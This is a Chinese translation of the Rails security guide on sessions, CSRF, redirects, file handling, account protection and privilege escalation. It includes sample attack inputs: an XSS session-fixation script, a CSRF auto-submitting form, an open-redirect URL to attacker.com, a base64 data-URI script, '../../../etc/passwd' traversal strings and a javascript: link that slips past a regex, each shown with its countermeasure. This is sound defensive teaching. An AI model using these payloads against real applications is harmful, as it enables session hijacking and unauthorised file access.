**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON https://guides.rubyonrails.org.**, original file md5: f769f3ad2ac56ac5949224832c8307e3
保护Rails应用程序的安全性
===========================

本手册描述了Web应用程序中常见的安全问题以及如何使用Rails避免这些问题。

阅读完本指南后，您将了解到：

* 所有被强调的对策。
* Rails中会话的概念，以及应该在其中放置什么内容和常见的攻击方法。
* 访问网站可能导致的安全问题（CSRF）。
* 在处理文件或提供管理界面时需要注意的事项。
* 如何管理用户：登录和注销以及各个层面的攻击方法。
* 最常见的注入攻击方法。

--------------------------------------------------------------------------------

介绍
------------

Web应用程序框架旨在帮助开发人员构建Web应用程序。其中一些框架还可以帮助您保护Web应用程序的安全性。实际上，一个框架并不比另一个框架更安全：如果您正确使用它，您将能够使用许多框架构建安全的应用程序。例如，Ruby on Rails具有一些聪明的辅助方法，例如防止SQL注入，因此这几乎不是一个问题。

总的来说，没有所谓的即插即用的安全性。安全性取决于使用框架的人，有时还取决于开发方法。它还取决于Web应用程序环境的所有层面：后端存储、Web服务器和Web应用程序本身（以及可能的其他层面或应用程序）。

然而，Gartner集团估计，75%的攻击发生在Web应用程序层，并发现“在300个经过审计的网站中，97%容易受到攻击”。这是因为Web应用程序相对容易受到攻击，因为它们易于理解和操作，即使是非专业人士也可以。

针对Web应用程序的威胁包括用户帐户劫持、绕过访问控制、读取或修改敏感数据或呈现欺诈内容。或者攻击者可能能够安装木马程序或垃圾邮件发送软件，以获取财务利益，或通过修改公司资源来损害品牌声誉。为了防止攻击、减少其影响并消除攻击点，首先，您必须充分了解攻击方法，以找到正确的对策。这就是本指南的目的。

为了开发安全的Web应用程序，您必须及时了解所有层面的情况，并了解您的敌人。订阅安全邮件列表、阅读安全博客，并养成更新和进行安全检查的习惯（请参阅[附加资源](#additional-resources)章节）。这是手动完成的，因为这样才能发现令人讨厌的逻辑安全问题。

会话
--------

本章描述了与会话相关的一些特定攻击以及保护会话数据的安全措施。

### 什么是会话？

INFO：会话使应用程序能够在用户与应用程序交互时保持用户特定的状态。例如，会话允许用户进行一次身份验证，并保持登录状态以供将来的请求使用。

大多数应用程序需要跟踪与应用程序交互的用户的状态。这可以是购物篮的内容，或者当前登录用户的用户ID。这种特定于用户的状态可以存储在会话中。

Rails为访问应用程序的每个用户提供一个会话对象。如果用户已经有一个活动会话，Rails将使用现有的会话。否则将创建一个新的会话。

注意：了解更多关于会话及其使用方法的信息，请阅读[Action Controller概述指南](action_controller_overview.html#session)。

### 会话劫持

WARNING：_窃取用户的会话ID会让攻击者以受害者的名义使用Web应用程序。_

许多Web应用程序都有一个身份验证系统：用户提供用户名和密码，Web应用程序对其进行检查，并将相应的用户ID存储在会话哈希中。从现在开始，会话是有效的。在每个请求中，应用程序将加载由会话中的用户ID标识的用户，而无需进行新的身份验证。Cookie中的会话ID标识会话。

因此，Cookie作为Web应用程序的临时身份验证。任何窃取他人的Cookie的人都可以以该用户的身份使用Web应用程序，可能会造成严重后果。以下是一些劫持会话的方法及其对策：
* 在不安全的网络中嗅探Cookie。无线局域网可以作为这样一个网络的例子。在未加密的无线局域网中，监听所有连接客户端的流量特别容易。对于Web应用程序构建者来说，这意味着要在SSL上提供安全连接。在Rails 3.1及更高版本中，可以通过在应用程序配置文件中始终强制使用SSL连接来实现：

    ```ruby
    config.force_ssl = true
    ```

* 大多数人在使用公共终端后不会清除Cookie。因此，如果上一个用户没有从Web应用程序中注销，您将能够以该用户的身份使用它。在Web应用程序中为用户提供一个注销按钮，并使其显眼。

* 许多跨站脚本（XSS）攻击旨在获取用户的Cookie。您将在稍后阅读有关XSS的更多信息。

* 攻击者不是窃取攻击者不知道的Cookie，而是修复他们所知道的用户会话标识符（在Cookie中）。稍后阅读有关这种所谓的会话固定的更多信息。

大多数攻击者的主要目标是赚钱。根据[Symantec互联网安全威胁报告（2017）](https://docs.broadcom.com/docs/istr-22-2017-en)，被盗银行登录帐户的地下价格范围为帐户余额的0.5％-10％，信用卡号码为0.5美元至30美元（完整详细信息为20美元至60美元），身份信息（姓名，社会安全号码和出生日期）为0.1美元至1.5美元，零售商帐户为20美元至50美元，云服务提供商帐户为6美元至10美元。

### 会话存储

注意：Rails使用`ActionDispatch::Session::CookieStore`作为默认会话存储。

提示：了解有关其他会话存储的更多信息，请参阅[Action Controller概述指南](action_controller_overview.html#session)。

Rails `CookieStore`将会话哈希保存在客户端的Cookie中。
服务器从Cookie中检索会话哈希并
消除了对会话ID的需求。这将极大地增加
应用程序的速度，但这是一个有争议的存储选项和
您必须考虑其安全性和存储限制：

* Cookie有4 kB的大小限制。仅使用与会话相关的数据的Cookie。

* Cookie存储在客户端。客户端可能会保留已过期的Cookie的内容。客户端可能会将Cookie复制到其他计算机。避免在Cookie中存储敏感数据。

* Cookie本质上是临时的。服务器可以为Cookie设置过期时间，但客户端可能会在此之前删除Cookie及其内容。将所有更持久性的数据保留在服务器端。

* 会话Cookie不会自动失效，可以被恶意重用。建议您的应用程序使用存储的时间戳使旧会话Cookie失效。

* Rails默认加密Cookie。客户端无法读取或编辑Cookie的内容，否则会破坏加密。如果妥善保管您的密钥，可以认为Cookie通常是安全的。

`CookieStore`使用
[encrypted](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted)
cookie jar提供安全的加密位置来存储会话
数据。基于Cookie的会话因此提供完整性和
对其内容的机密性。加密密钥以及用于
[signed](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed)
cookie的验证密钥都来自`secret_key_base`配置值。

提示：密钥必须长且随机。使用`bin/rails secret`获取新的唯一密钥。

信息：在本指南的后面了解有关[管理凭据的更多信息](security.html#custom-credentials)

还要重要的是为加密和
签名Cookie使用不同的盐值。对于不同的盐配置
使用相同的值可能导致相同的派生密钥用于不同的
安全功能，从而可能削弱密钥的强度。

在测试和开发应用程序中，从应用程序名称派生一个`secret_key_base`。其他环境必须使用`config/credentials.yml.enc`中的随机密钥，如下所示（解密状态）：

```yaml
secret_key_base: 492f...
```

警告：如果您的应用程序的密钥可能已经被泄露，请强烈考虑更改它们。请注意，更改`secret_key_base`将使当前活动会话过期，并要求所有用户重新登录。除了会话数据外，加密Cookie、签名Cookie和Active Storage文件也可能受到影响。

### 旋转加密和签名Cookie配置

旋转是更改Cookie配置并确保旧Cookie
不会立即失效的理想方法。然后，您的用户有机会访问您的站点，
使用旧配置读取其Cookie，并使用新更改重新写入Cookie。
一旦您对用户有足够的信心已经有机会升级他们的Cookie，就可以删除旋转。

可以对加密和签名的cookie进行密码和摘要的旋转。

例如，要将签名cookie的摘要从SHA1更改为SHA256，首先要分配新的配置值：

```ruby
Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
```

现在为旧的SHA1摘要添加一个旋转，以便现有的cookie可以无缝地升级到新的SHA256摘要。

```ruby
Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end
```

然后，任何写入的签名cookie都将使用SHA256进行摘要。使用SHA1编写的旧cookie仍然可以读取，并且如果访问，将使用新的摘要进行编写，以便在删除旋转时进行升级并且不会无效。

一旦使用SHA1摘要的签名cookie的用户不再有机会重写他们的cookie，就可以删除旋转。

虽然您可以设置任意数量的旋转，但通常不会同时进行多个旋转。

有关使用加密和签名消息进行密钥旋转以及`rotate`方法接受的各种选项的更多详细信息，请参阅[MessageEncryptor API](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html)和[MessageVerifier API](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html)文档。

### CookieStore会话的重放攻击

提示：_在使用`CookieStore`时，您还必须注意重放攻击。_

它的工作原理如下：

* 用户获得积分，金额存储在会话中（这本来就是一个坏主意，但我们将出于演示目的而这样做）。
* 用户购买某物。
* 新的调整后的积分值存储在会话中。
* 用户获取第一步中的cookie（他们之前复制过的），并替换浏览器中的当前cookie。
* 用户恢复了他们最初的积分。

在会话中包含一个nonce（随机值）可以解决重放攻击。一个nonce只能使用一次，服务器必须跟踪所有有效的nonce。如果您有多个应用服务器，情况会变得更加复杂。将nonce存储在数据库表中将破坏CookieStore的整个目的（避免访问数据库）。

最好的解决方法是_不要将这种类型的数据存储在会话中，而是存储在数据库中_。在这种情况下，将积分存储在数据库中，并将`logged_in_user_id`存储在会话中。

### 会话固定

注意：_除了窃取用户的会话ID，攻击者还可以固定他们已知的会话ID。这被称为会话固定。_

![会话固定](images/security/session_fixation.png)

这种攻击专注于固定攻击者已知的用户会话ID，并强制用户的浏览器使用此ID。因此，攻击者之后无需窃取会话ID。以下是此攻击的工作原理：

* 攻击者创建一个有效的会话ID：他们加载要固定会话的Web应用程序的登录页面，并从响应中获取cookie中的会话ID（请参见图像中的1和2号）。
* 他们通过定期访问Web应用程序来保持会话的活动状态。
* 攻击者强制用户的浏览器使用此会话ID（请参见图像中的3号）。由于不能更改另一个域的cookie（由于同源策略），攻击者必须从目标Web应用程序的域运行JavaScript。通过XSS将JavaScript代码注入应用程序可以实现此攻击。以下是一个示例：`<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`。稍后了解有关XSS和注入的更多信息。
* 攻击者诱使受害者访问带有JavaScript代码的受感染页面。通过查看页面，受害者的浏览器将会话ID更改为陷阱会话ID。
* 由于新的陷阱会话未使用，Web应用程序将要求用户进行身份验证。
* 从现在开始，受害者和攻击者将共同使用相同的会话使用Web应用程序：会话变为有效，受害者没有注意到攻击。

### 会话固定 - 对策

提示：_一行代码将保护您免受会话固定攻击。_

最有效的对策是_在成功登录后发出新的会话标识符，并声明旧标识符无效_。这样，攻击者无法使用固定的会话标识符。这也是对抗会话劫持的良好对策。以下是在Rails中创建新会话的方法：
```ruby
reset_session
```

如果您使用流行的[Devise](https://rubygems.org/gems/devise) gem来进行用户管理，它会自动在登录和登出时过期会话。如果您自己开发，请记得在登录操作后（会话创建时）过期会话。这将从会话中删除值，因此_您需要将它们转移到新会话中_。

另一种对策是_将用户特定属性保存在会话中_，每次请求到来时验证它们，并在信息不匹配时拒绝访问。这些属性可以是远程IP地址或用户代理（Web浏览器名称），尽管后者不太具体。在保存IP地址时，您必须记住，有些互联网服务提供商或大型组织会将其用户放在代理后面。_这些可能会在会话过程中发生变化_，因此这些用户将无法或只能以有限的方式使用您的应用程序。

### 会话过期

注意：_永不过期的会话会增加跨站请求伪造（CSRF）、会话劫持和会话固定等攻击的时间窗口_。

一种可能的方法是设置带有会话ID的cookie的过期时间戳。然而，客户端可以编辑存储在Web浏览器中的cookie，因此在服务器上过期会话更安全。以下是如何在数据库表中_过期会话_的示例。调用`Session.sweep(20.minutes)`来过期使用时间超过20分钟的会话。

```ruby
class Session < ApplicationRecord
  def self.sweep(time = 1.hour)
    where(updated_at: ...time.ago).delete_all
  end
end
```

关于会话固定的部分介绍了会话的维持问题。攻击者每隔五分钟维持一个会话，可以使会话永久保持活动状态，尽管您正在过期会话。一个简单的解决方案是在会话表中添加一个`created_at`列。现在，您可以删除很久以前创建的会话。在上面的sweep方法中使用以下行：

```ruby
where(updated_at: ...time.ago).or(where(created_at: ...2.days.ago)).delete_all
```

跨站请求伪造（CSRF）
---------------------

这种攻击方法是通过在页面中包含恶意代码或链接来访问用户被认为已经进行身份验证的Web应用程序。如果该Web应用程序的会话尚未超时，攻击者可以执行未经授权的命令。

![跨站请求伪造](images/security/csrf.png)

在[会话章节](#sessions)中，您已经了解到大多数Rails应用程序使用基于cookie的会话。它们要么将会话ID存储在cookie中并具有服务器端会话哈希，要么整个会话哈希位于客户端。无论哪种情况，如果浏览器能够找到该域的cookie，它都会自动在每个请求中发送cookie。有争议的是，如果请求来自不同域的站点，它也会发送cookie。让我们从一个例子开始：

* Bob浏览一个留言板，查看黑客发布的帖子，其中包含一个精心制作的HTML图像元素。该元素引用了Bob的项目管理应用程序中的一个命令，而不是图像文件：`<img src="http://www.webapp.com/project/1/destroy">`
* Bob在`www.webapp.com`的会话仍然有效，因为他几分钟前没有注销。
* 通过查看帖子，浏览器找到一个图像标签。它尝试从`www.webapp.com`加载疑似图像。如前所述，它还会发送带有有效会话ID的cookie。
* `www.webapp.com`的Web应用程序验证相应会话哈希中的用户信息，并销毁ID为1的项目。然后返回一个结果页面，这对于浏览器来说是一个意外的结果，因此它不会显示图像。
* Bob没有注意到这次攻击，但几天后他发现项目编号一消失了。

重要的是要注意，实际的精心制作的图像或链接不一定要位于Web应用程序的域中，它可以位于任何地方 - 在论坛、博客文章或电子邮件中。

CSRF在CVE（常见漏洞和暴露）中出现的频率非常低 - 2006年不到0.1% - 但它确实是一个“沉睡的巨人”[Grossman]。这与许多安全合同工作的结果形成鲜明对比 - _CSRF是一个重要的安全问题_。
### CSRF防御措施

注意：首先，根据W3C的要求，适当使用GET和POST。其次，非GET请求中的安全令牌将保护您的应用程序免受CSRF攻击。

#### 适当使用GET和POST

HTTP协议基本上提供了两种主要类型的请求 - GET和POST（DELETE，PUT和PATCH应该像POST一样使用）。世界广泛网联盟（W3C）为选择HTTP GET或POST提供了一个检查清单：

**如果满足以下条件，请使用GET：**

* 交互更像是一个问题（即，它是一个安全操作，如查询、读取操作或查找）。

**如果满足以下条件，请使用POST：**

* 交互更像是一个命令，或者
* 交互以一种用户可以感知到的方式改变了资源的状态（例如，订阅服务），或者
* 用户对交互的结果负有责任。

如果您的Web应用程序是RESTful的，您可能习惯于使用其他HTTP动词，如PATCH、PUT或DELETE。然而，一些旧版的Web浏览器不支持它们 - 只支持GET和POST。Rails使用一个隐藏的`_method`字段来处理这些情况。

_POST请求也可以自动发送。在这个例子中，链接 www.harmless.com 显示为浏览器状态栏中的目标。但实际上，它实际上是动态创建了一个发送POST请求的新表单。

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
```

或者攻击者将代码放入图像的onmouseover事件处理程序中：

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

还有许多其他可能性，比如使用`<script>`标签向具有JSONP或JavaScript响应的URL发出跨站点请求。响应是攻击者可以找到一种运行的可执行代码，可能提取敏感数据。为了防止数据泄漏，我们必须禁止跨站点的`<script>`标签。然而，Ajax请求遵循浏览器的同源策略（只允许您自己的站点发起`XmlHttpRequest`），因此我们可以安全地允许它们返回JavaScript响应。

注意：我们无法区分`<script>`标签的来源 - 它是您自己站点上的标签还是其他恶意站点上的标签，因此我们必须在整个范围内阻止所有`<script>`，即使它实际上是从您自己的站点提供的安全的同源脚本。在这些情况下，明确跳过为`<script>`标签提供JavaScript的CSRF保护。

#### 必需的安全令牌

为了防止所有其他伪造的请求，我们引入了一个我们的站点知道但其他站点不知道的“必需的安全令牌”。我们在请求中包含安全令牌，并在服务器上进行验证。当[`config.action_controller.default_protect_from_forgery`][]设置为`true`时，这将自动完成，这是新创建的Rails应用程序的默认设置。您也可以通过在应用程序控制器中添加以下内容来手动完成：

```ruby
protect_from_forgery with: :exception
```

这将在Rails生成的所有表单中包含一个安全令牌。如果安全令牌与预期的不匹配，将抛出异常。

在使用[Turbo](https://turbo.hotwired.dev/)提交表单时，也需要安全令牌。Turbo会在您的应用程序布局的`csrf`元标签中查找令牌，并将其添加到请求的`X-CSRF-Token`请求头中。这些元标签是使用[`csrf_meta_tags`][]辅助方法创建的：

```erb
<head>
  <%= csrf_meta_tags %>
</head>
```

生成的结果如下：

```html
<head>
  <meta name="csrf-param" content="authenticity_token" />
  <meta name="csrf-token" content="THE-TOKEN" />
</head>
```

在使用JavaScript进行自己的非GET请求时，也需要安全令牌。[Rails Request.JS](https://github.com/rails/request.js)是一个封装了添加所需请求头的逻辑的JavaScript库。

在使用其他库进行Ajax调用时，需要自己将安全令牌添加为默认头。要从元标签中获取令牌，您可以执行类似以下的操作：

```javascript
document.head.querySelector("meta[name=csrf-token]")?.content
```

#### 清除持久性Cookie

通常使用持久性Cookie存储用户信息，例如使用`cookies.permanent`。在这种情况下，Cookie不会被清除，而且开箱即用的CSRF保护将无效。如果您在此信息中使用的是与会话不同的其他Cookie存储，您必须自行处理如何处理它：

```ruby
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # 销毁用户的cookie的示例方法
end
```

上述方法可以放置在`ApplicationController`中，当非GET请求中没有或者CSRF令牌不正确时会被调用。

请注意，_跨站脚本攻击（XSS）漏洞可以绕过所有CSRF保护措施_。XSS使攻击者可以访问页面上的所有元素，因此他们可以从表单中读取CSRF安全令牌或直接提交表单。稍后阅读有关XSS的[更多信息](#cross-site-scripting-xss)。

重定向和文件
---------------------

另一类与Web应用程序中的重定向和文件相关的安全漏洞。

### 重定向

警告：_Web应用程序中的重定向是一种被低估的黑客工具：攻击者不仅可以将用户转发到陷阱网站，还可以创建一个自包含的攻击。_

每当允许用户传递（部分）URL以进行重定向时，可能存在漏洞。最明显的攻击是将用户重定向到一个看起来和原始网站完全相同的假网站。这种所谓的钓鱼攻击通过在电子邮件中向用户发送一个不可疑的链接，通过XSS注入链接到Web应用程序中，或将链接放入外部站点中来实现。这是不可疑的，因为链接以Web应用程序的URL开头，恶意站点的URL隐藏在重定向参数中：http://www.example.com/site/redirect?to=www.attacker.com。以下是一个遗留操作的示例：

```ruby
def legacy
  redirect_to(params.update(action: 'main'))
end
```

如果用户尝试访问遗留操作，将重定向用户到主操作。意图是保留URL参数到遗留操作并将它们传递到主操作。然而，如果攻击者在URL中包含了一个主机密钥，它可以被利用：

```
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
```

如果它在URL的末尾，它几乎不会被注意到，并将用户重定向到`attacker.com`主机。作为一般规则，将用户输入直接传递给`redirect_to`被认为是危险的。一个简单的对策是_只在遗留操作中包含预期的参数_（再次是允许列表方法，而不是删除意外的参数）。_如果要重定向到URL，请使用允许列表或正则表达式进行检查_。

#### 自包含的XSS

Firefox和Opera中的另一种重定向和自包含的XSS攻击是使用数据协议。该协议直接在浏览器中显示其内容，可以是HTML或JavaScript甚至整个图像：

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

这个示例是一个Base64编码的JavaScript，显示一个简单的消息框。在重定向URL中，攻击者可以将恶意代码重定向到此URL。作为对策，_不要允许用户提供（部分）要重定向到的URL_。

### 文件上传

注意：_确保文件上传不会覆盖重要文件，并异步处理媒体文件。_

许多Web应用程序允许用户上传文件。_用户可以选择（部分）的文件名应始终进行过滤_，因为攻击者可以使用恶意文件名覆盖服务器上的任何文件。如果您将文件上传存储在/var/www/uploads，而用户输入一个文件名如"../../../etc/passwd"，它可能会覆盖一个重要文件。当然，Ruby解释器需要适当的权限来执行此操作 - 这是以较低特权的Unix用户运行Web服务器、数据库服务器和其他程序的另一个原因。

在过滤用户输入文件名时，_不要尝试删除恶意部分_。想象一种情况，Web应用程序删除文件名中的所有"../"，而攻击者使用类似"....//"的字符串 - 结果将是"../"。最好使用允许列表方法，_使用一组接受的字符检查文件名的有效性_。这与尝试删除不允许的字符的受限列表方法相对。如果它不是有效的文件名，请拒绝它（或替换不接受的字符），但不要删除它们。这是来自[attachment_fu插件](https://github.com/technoweenie/attachment_fu/tree/master)的文件名清理器的示例：

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # 注意：File.basename在Unix上的Windows路径无法正常工作
    # 仅获取文件名，而不是整个路径
    name.sub!(/\A.*(\\|\/)/, '')
    # 最后，将所有非字母数字、下划线或句点替换为下划线
    name.gsub!(/[^\w.-]/, '_')
  end
end
```

同步处理文件上传（如`attachment_fu`插件处理图像）的一个重要缺点是它容易受到拒绝服务攻击的影响。攻击者可以从多台计算机同步开始图像文件上传，从而增加服务器负载，最终导致服务器崩溃或停顿。

解决这个问题的最佳方法是异步处理媒体文件：保存媒体文件并在数据库中安排一个处理请求。第二个进程将在后台处理文件。

### 文件上传中的可执行代码

警告：当将源代码放置在特定目录中时，上传的文件中的源代码可能会被执行。如果Apache的主目录是Rails的/public目录，请不要将文件上传到其中。

流行的Apache Web服务器有一个名为DocumentRoot的选项。这是网站的主目录，该目录树中的所有内容都将由Web服务器提供。如果存在具有特定文件扩展名的文件，当请求时其中的代码将被执行（可能需要设置一些选项）。其中的示例是PHP和CGI文件。现在想象一种情况，攻击者上传了一个名为"file.cgi"的文件，并在其中包含了将在有人下载该文件时执行的代码。

如果您的Apache DocumentRoot指向Rails的/public目录，请不要将文件上传到其中，至少将文件存储在上一级。

### 文件下载

注意：确保用户不能下载任意文件。

与上传文件一样，您必须对下载文件进行过滤。`send_file()`方法将文件从服务器发送到客户端。如果您使用用户输入的文件名而没有进行过滤，任何文件都可以被下载：

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

只需传递一个文件名，例如"../../../etc/passwd"，即可下载服务器的登录信息。对此的一个简单解决方案是_检查所请求的文件是否在预期的目录中_：

```ruby
basename = File.expand_path('../../files', __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename != File.expand_path(File.dirname(filename))
send_file filename, disposition: 'inline'
```

另一种（附加的）方法是将文件名存储在数据库中，并根据数据库中的ID为文件命名。这也是避免执行上传文件中可能存在的代码的一个好方法。`attachment_fu`插件以类似的方式实现了这一点。

用户管理
---------------

注意：几乎每个Web应用程序都必须处理授权和身份验证。与其自己开发，建议使用常见的插件。但也要保持它们的最新状态。一些额外的预防措施可以使您的应用程序更加安全。

Rails有许多可用的身份验证插件。像流行的[devise](https://github.com/heartcombo/devise)和[authlogic](https://github.com/binarylogic/authlogic)这样的好插件只存储密码的加密哈希值，而不是明文密码。自Rails 3.1起，您还可以使用内置的[`has_secure_password`](https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password)方法，该方法支持安全的密码哈希、确认和恢复机制。

### 暴力破解账户

注意：对账户进行暴力破解是对登录凭据进行试错攻击。通过更通用的错误消息和可能要求输入验证码来防御它们。

您的Web应用程序的用户名列表可能会被滥用以对应的密码进行暴力破解，因为大多数人不使用复杂的密码。大多数密码是字典词汇和可能的数字的组合。因此，使用用户名列表和字典，自动程序可以在几分钟内找到正确的密码。

因此，大多数Web应用程序在用户名或密码不正确时会显示一个通用的错误消息"用户名或密码不正确"。如果它说"您输入的用户名未找到"，攻击者可以自动编制一个用户名列表。

然而，大多数Web应用程序设计者忽略了忘记密码页面。这些页面通常会承认输入的用户名或电子邮件地址（未）找到。这使得攻击者可以编制一个用户名列表并对账户进行暴力破解。

为了减轻此类攻击，_在忘记密码页面上显示一个通用的错误消息_。此外，您可以_要求在某个IP地址的一定数量的登录失败后输入验证码_。然而，请注意，这不是一个针对自动程序的绝对解决方案，因为这些程序可能会经常更改其IP地址。然而，它提高了攻击的难度。
### 账户劫持

许多网络应用程序使劫持用户账户变得容易。为什么不与众不同，让它变得更加困难呢？

#### 密码

想象一种情况，攻击者窃取了用户的会话cookie，从而可以共同使用应用程序。如果更改密码很容易，攻击者只需点击几下即可劫持账户。或者如果更改密码表单容易受到CSRF攻击，攻击者可以通过引诱受害者访问一个包含特制IMG标签的网页来更改受害者的密码。作为对策，当然要_使更改密码表单免受CSRF攻击_，并_要求用户在更改密码时输入旧密码_。

#### 电子邮件

然而，攻击者还可以通过更改电子邮件地址来接管账户。在他们更改地址后，他们将转到忘记密码页面，(可能是新的)密码将发送到攻击者的电子邮件地址。作为对策，_在更改电子邮件地址时也要求用户输入密码_。

#### 其他

根据您的网络应用程序，可能还有其他劫持用户账户的方法。在许多情况下，CSRF和XSS会有所帮助。例如，在[Google Mail](https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/)中的CSRF漏洞中。在这种概念验证攻击中，受害者将被引诱访问攻击者控制的网站。该网站上有一个特制的IMG标签，它会导致一个HTTP GET请求，从而更改Google Mail的过滤器设置。如果受害者已登录Google Mail，攻击者将更改过滤器以将所有电子邮件转发到他们的电子邮件地址。这几乎和完全劫持账户一样有害。作为对策，_审查您的应用程序逻辑并消除所有XSS和CSRF漏洞_。

### CAPTCHA

信息：_CAPTCHA是一种挑战-响应测试，用于确定响应不是由计算机生成的。它经常用于通过要求用户输入扭曲图像中的字母来保护注册表单免受攻击者和评论表单免受自动垃圾邮件机器人的攻击。这是正面的CAPTCHA，但也有负面的CAPTCHA。负面CAPTCHA的想法不是让用户证明他们是人类，而是揭示机器人是机器人。_

一个流行的正面CAPTCHA API是[reCAPTCHA](https://developers.google.com/recaptcha/)，它显示了两个来自旧书的扭曲图像中的单词。它还添加了一个倾斜的线条，而不是以前的CAPTCHA中的扭曲背景和文本上的高度扭曲，因为后者已经被破解。作为额外的好处，使用reCAPTCHA有助于数字化旧书。[ReCAPTCHA](https://github.com/ambethia/recaptcha/)也是一个名为API的Rails插件。

您将从API获得两个密钥，一个是公钥，一个是私钥，您需要将它们放入Rails环境中。之后，您可以在视图中使用recaptcha_tags方法，在控制器中使用verify_recaptcha方法。如果验证失败，verify_recaptcha将返回false。
CAPTCHA的问题在于它对用户体验有负面影响。此外，一些视力受损的用户发现某些类型的扭曲CAPTCHA难以阅读。尽管如此，正面CAPTCHA仍然是防止各种类型的机器人提交表单的最佳方法之一。

大多数机器人都非常幼稚。它们爬行网络并将垃圾邮件放入它们能找到的每个表单字段中。负面CAPTCHA利用这一点，在表单中包含一个“蜜罐”字段，通过CSS或JavaScript对人类用户隐藏该字段。

请注意，负面CAPTCHA只对幼稚的机器人有效，并不能足以保护关键应用程序免受有针对性的机器人攻击。尽管如此，负面和正面CAPTCHA可以结合使用以提高性能，例如，如果“蜜罐”字段不为空（检测到机器人），则无需验证正面CAPTCHA，这将需要在计算响应之前向Google ReCaptcha发出HTTPS请求。

以下是如何通过JavaScript和/或CSS隐藏蜜罐字段的一些想法：

* 将字段定位在页面的可见区域之外
* 使元素非常小或将其颜色与页面背景相同
* 保留字段的显示，但告诉人类用户将其留空
最简单的负面CAPTCHA是一个隐藏的蜜罐字段。在服务器端，您将检查字段的值：如果它包含任何文本，那么它必须是一个机器人。然后，您可以忽略帖子或返回一个积极的结果，但不保存帖子到数据库中。这样，机器人就会满意并继续前进。

您可以在Ned Batchelder的[博客文章](https://nedbatchelder.com/text/stopbots.html)中找到更复杂的负面CAPTCHA：

* 在字段中包含当前UTC时间戳，并在服务器上进行检查。如果时间戳过旧或者在未来，表单无效。
* 随机化字段名称
* 包含多个蜜罐字段，包括提交按钮

请注意，这只能保护您免受自动机器人的攻击，定制的有针对性的机器人无法通过此方法停止。因此，负面CAPTCHA可能不适合保护登录表单。

### 日志记录

警告：_告诉Rails不要将密码记录在日志文件中。_

默认情况下，Rails会记录所有发送到Web应用程序的请求。但是日志文件可能是一个巨大的安全问题，因为它们可能包含登录凭据、信用卡号等等。在设计Web应用程序安全概念时，您还应该考虑如果攻击者获得（完全）访问Web服务器会发生什么。如果日志文件以明文列出它们，那么在数据库中加密秘密和密码将是相当无用的。您可以通过将它们附加到应用程序配置中的[`config.filter_parameters`][]来从日志文件中_过滤掉某些请求参数_。这些参数将在日志中标记为[FILTERED]。

```ruby
config.filter_parameters << :password
```

注意：提供的参数将通过部分匹配正则表达式进行过滤。Rails会在适当的初始化器（`initializers/filter_parameter_logging.rb`）中添加一系列默认过滤器，包括`：passw`、`：secret`和`：token`，以处理像`password`、`password_confirmation`和`my_token`这样的典型应用程序参数。

### 正则表达式

信息：_在Ruby的正则表达式中，常见的错误是使用^和$来匹配字符串的开头和结尾，而不是\A和\z。_

Ruby在匹配字符串的末尾和开头上使用了与许多其他语言稍有不同的方法。这就是为什么即使许多Ruby和Rails书籍也会犯这个错误。那么这是一个安全威胁吗？假设您想要宽松验证一个URL字段，并且您使用了一个简单的正则表达式，如下所示：

```ruby
  /^https?:\/\/[^\n]+$/i
```

这在某些语言中可能运行良好。然而，在Ruby中，`^`和`$`匹配的是**行**的开头和行的结尾。因此，像这样的URL可以顺利通过过滤器：

```
javascript:exploit_code();/*
http://hi.com
*/
```

这个URL可以通过过滤器，因为正则表达式匹配了第二行，其余部分并不重要。现在想象一下，我们有一个视图，像这样显示URL：

```ruby
  link_to "Homepage", @user.homepage
```

这个链接对访问者来说看起来是无害的，但当它被点击时，它将执行JavaScript函数"exploit_code"或攻击者提供的任何其他JavaScript代码。

为了修复正则表达式，应该使用`\A`和`\z`代替`^`和`$`，如下所示：

```ruby
  /\Ahttps?:\/\/[^\n]+\z/i
```

由于这是一个常见的错误，格式验证器（validates_format_of）现在如果提供的正则表达式以^开头或以$结尾，将会引发异常。如果确实需要使用^和$而不是\A和\z（这很少见），可以将:multiline选项设置为true，如下所示：

```ruby
  # content should include a line "Meanwhile" anywhere in the string
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

请注意，这只能保护您免受在使用格式验证器时最常见的错误。您始终需要记住，在Ruby中，^和$匹配的是**行**的开头和行的结尾，而不是字符串的开头和结尾。

### 权限提升

警告：_更改单个参数可能会给用户未经授权的访问权限。请记住，无论您隐藏或混淆多少，每个参数都可能被更改。_

用户可能篡改的最常见参数是id参数，例如`http://www.domain.com/project/1`，其中1是id。它将在控制器的params中可用。在那里，您很可能会执行以下操作：
```ruby
@project = Project.find(params[:id])
```

对于一些Web应用程序来说，这是可以的，但是如果用户没有权限查看所有项目，那么就不适用了。如果用户将id更改为42，并且他们没有权限查看该信息，他们仍然可以访问它。相反，还应该“查询用户的访问权限”：

```ruby
@project = @current_user.projects.find(params[:id])
```

根据您的Web应用程序，用户可以篡改的参数将会更多。作为一个经验法则，“除非有证据证明用户输入数据是安全的，否则没有用户输入数据是安全的，用户的每个参数都有可能被篡改”。

